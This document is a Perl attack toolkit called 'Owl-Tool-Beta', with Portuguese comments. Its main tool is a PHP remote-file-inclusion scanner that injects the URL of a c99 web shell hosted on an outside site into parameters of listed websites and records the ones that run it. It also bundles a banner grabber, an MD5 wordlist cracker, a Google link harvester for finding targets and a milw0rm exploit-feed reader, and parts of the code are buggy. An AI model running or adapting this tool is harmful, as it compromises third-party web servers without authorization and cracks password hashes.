#!/usr/bin/perl
#################################---> Modulos
use Term::ANSIColor;
use HTML::LinkExtor;
use LWP::UserAgent;
IO::Socket::INET;
use Digest::MD5 qw(md5_hex);
use warnings;
#################################---> Carregando Limpa tela
my $sis="$^O";
if ($sis eq MSWin32) { $cmd="cls"; } else { $cmd="clear"; }
inicio: print `$cmd`;
#################################---> Banner de inicio
image();
my $valor=<STDIN>; chomp $valor;
if ($valor eq 0) { exit; }
if ($valor eq 1) {
#################################---> Variavel responsavel pela CMD
$cm = "http://www.defcont4.hypersite.com.br/shell/c99.txt?";
#################################---> Pegando variaveis do usuario
print "qual nome do arquivo txt que contem as listas para scan,apenas o nome \? \n";
my $lista = <STDIN>; chomp $lista;
print "Se nao quiser proxy coloque 0 \n";
print "Qual o proxy \? exemplo 200.1.2.0:8080 \n";
my $proxy = <STDIN>; chomp $proxy;
#################################---> iniciando constructor de Agent Stealth
$agent = new LWP::UserAgent;
$agent->agent('Mozilla/5.0 (X11; U; Gentoo Linux amd64; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');
$agent->cookie_jar( {} );
$agent->timeout(10);
################################---> Condicao do uso do proxy
if($proxy!=0) {
  $agent->env_proxy();
  $agent->proxy("http", "http://$proxy/");
}
################################---> iniciando filtro com regex
open (my $injection, "<$lista.txt")|| die "erro em abrir $lista.txt $!\n";
while (<$injection>) {
if ($_ =~ s/$\=.*/=$cmd/mg) {
open(LOG,">>sites.txt"); print LOG "$_"; close(LOG); }
}
  print "pronto links separados e com CMD injetada\n";
close $injection;
################################---> iniciando Scaner de PHP-injection
print "agora o scan vai procurar sites vulneraveis\n";
open (my $teste, "<sites.txt");
while (<$teste>) {
my $pagina="$_"."$cm";
my $request = HTTP::Request->new('GET',$pagina);
my $result = $agent->request($request);
my $site = $agent->request($request);               # $result->content();
if ($site->is_success) { if($site->content =~ /c99/) {
open (OUT, ">>vuln.txt"); print OUT "$pagina\n"; close(OUT); }}
}
print "Scan-owl terminado\nabra vuln.txt para ver sites vuln\n"; close($teste);
sleep 3; goto inicio;
}
################################---> Host predict
if ($valor eq 2) {
print "qual pagina voce quer ver info \?\n";
my $pagin=<STDIN>; chomp $pagin;
my $socket = IO::Socket::INET->new(
                                       PeerAddr => "$pagin",
                                       PeerPort => "80",
                                       Timeout => "7",
                                       Proto => "tcp"
  );
die "Nao foi possivel criar a socket\n" unless $socket;
if ($socket) {
print $socket "GET /index.html HTTP/1.0\r\n\r\n";
while (<$socket>) {
if ($_ =~ /Date:|Server:|squid|system/){
print "$_"; }
}}
my $ip = inet_ntoa(inet_aton($pagin));
print "IP:$ip\n";
close($socket);
sleep 8; goto inicio;
}
##############################---> novidades do boteco
if ($valor eq 3) {
print "pegando ultimos posts do blog botecounix.serveftp.com\n";
my $pagi="http://cooler.justfree.com/boteco/?feed=rss2";
$agent = new LWP::UserAgent;
$request = HTTP::Request->new('GET',$pagi);
$result = $agent->request($request);
@result = $result->content();
open(RES,">","novi.txt");
print RES @result; close(RES); open(RES,"<","novi.txt");
@texto = <RES>; close(RES); unlink ("novi.txt");
foreach (@texto) {
if ($_ =~ m/<(title|link)>(.*?)<\/(title|link)>/) {
my $nova="$2";
print "$nova\n"; }}
sleep 8; goto inicio;                   
}
#############################---> novidades milw0rm
if ($valor eq 4) {
  &milworm(); sleep 5; goto inicio;
}
#############################---> MD5 Crack
if ($valor eq 5) {
print "MD5 crack\n";
print "Author: evolution0x55 \n";
print "Wordlist file? ";
chomp($file=<>);

open(FOPEN, $file) or die($file." not found!");

print "\nMD5 Hash? ";
chomp($hash=<>);
print "\n";

foreach (<FOPEN>){
    $line_hash=md5_hex($_);
    if ($line_hash eq $hash){
        print "CRACKED: ".$_;
        exit 0;
        }
    print $_.":".$hash." [FAILED]\n";
}
close(FOPEN);
print "\n\nHash not cracked.";
sleep 10; goto inicio;
}

#################################----> Googler
if ($valor eq 6) {
#################################---> Pegando Variaveis do usuario
#unlink resposta.txt;
print "Googler LinkExtor by C00L3R\n";
print "vamos la, Qual string de busca \?\n";
my $string = <STDIN>; chomp $string;
print "Se nao quiser proxy coloque 0 \n";
print "Qual o proxy \? exemplo 200.1.2.0:8080 \n";
my $proxy = <STDIN>; chomp $proxy;
#################################---> iniciando constructor Stealth
my $agent = new LWP::UserAgent;
$agent->agent('Mozilla/5.0 (X11; U; Gentoo Linux amd64; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');
$agent->cookie_jar( {} );
#################################---> Ativando Proxy
if($proxy!=0) {
  $agent->env_proxy();
  $agent->proxy("http", "http://$proxy/");
}
#################################---> Loop de Busca do Google
print "fazendo busca isso pode demorar minutos\n";
for(my $i=10;$i<100;$i+=2) {
my $pa="http://www.google.com.pl/search?q=$string&start=$i";
my $request = HTTP::Request->new('GET',$pa);
my $result = $agent->request($request);
my $resposta = $result->content();
open (OUT, ">>paginas.txt");
print OUT "$resposta\n"; close(OUT);
}
#################################---> Extraindo Links
eval {
print "paginas pegas agora extraindo os links\n"; sleep 3;
my $parser = HTML::LinkExtor->new;
$parser->parse_file("paginas.txt");
my @links = $parser->links;
  foreach (@links) {
   print 'Type: ', shift @$_, "\n";
    while (my ($name, $val) = splice(@$_, 0, 2)) {
     print " $name -> $val\n";
       if ($val !~ /videos.*|google.*|groups.*|image.*|www\.google.*|orkut.*|64.*|youtube.*/) {
open (OUT, ">>resposta.txt"); print OUT "$val\n"; close(OUT);
        print "$val\n";
       }
    }
  }
#unlink paginas.txt;
print "Scan Caos Google terminado resultado salvo em resposta.txt\n";
}
}

################################--->funcoes diversas
sub milworm() {
@sploits = (); $version = 1.0; $getit = 'http://milw0rm.com/rss.php';
$agent = new LWP::UserAgent; $request = HTTP::Request->new('GET',$getit);
$result = $agent->request($request); $getit =~ s/.*\///;
@result = $result->content(); open(RES,">","mille.txt");
print RES @result; close(RES); open(RES,"<","mille.txt");
@inhalt = <RES>; close(RES); unlink ("mille.txt");
foreach $shit (@inhalt) { $shit =~ tr/</ /; $shit =~ tr/>/ /;
$shit =~ tr/\// /; $shit =~ s/milw0rm.com//ig;
if ($shit =~ m/title/i) { $shit =~ s/title/ /ig; push(@sploits,"$shit");
} } print @sploits; }

sub image {
print q{
                  Owl-Tool-Beta
=======================================================
|| ...    *    .   _  .      *               *        ||
||*  .  *     .   * (_)   *                           ||
||  .      |*  ..   *   ..                            ||
||   .  * \|  * .___.  .. *               *           ||
||*   \/   |/ \/(o,o)     .                      *    ||
||  _\_\   |  / /)  )* _/_ *                          ||
||      \ \| /,--"-"---  ..    *    Coded by C00l3r_  ||
||_-----`  |(,__,__/__/_ .         *                  ||
||       \ ||      ..                 *               ||
||        ||| .            *                          ||
|| *      |||                     *                   ||
||      * |||           *              *              ||
||, -=-~' .-^- _--^----.-.-.-.-^.-.-.-.-.-.-.-.-.-.-  ||
||           `                                        ||
=======================================================
             http://BotecoUnix.com.br
--------------------------------------------------------
0- Sair
1- Coruja php injectScan 0.1
2- Httpd type Scan
3- BotecoUnix News
4- Milw0rm News
5- MD5 crack
6- Googler LinkExtor term version 0.2
==================================================================
thanks furadordeSyS,r0t3d,b4rtb0y,_mlk_,voidpointer,st4t1c,C0lt7r
my parents and relatives,my friends thanks for all
------------------------------------------------------------------
}}
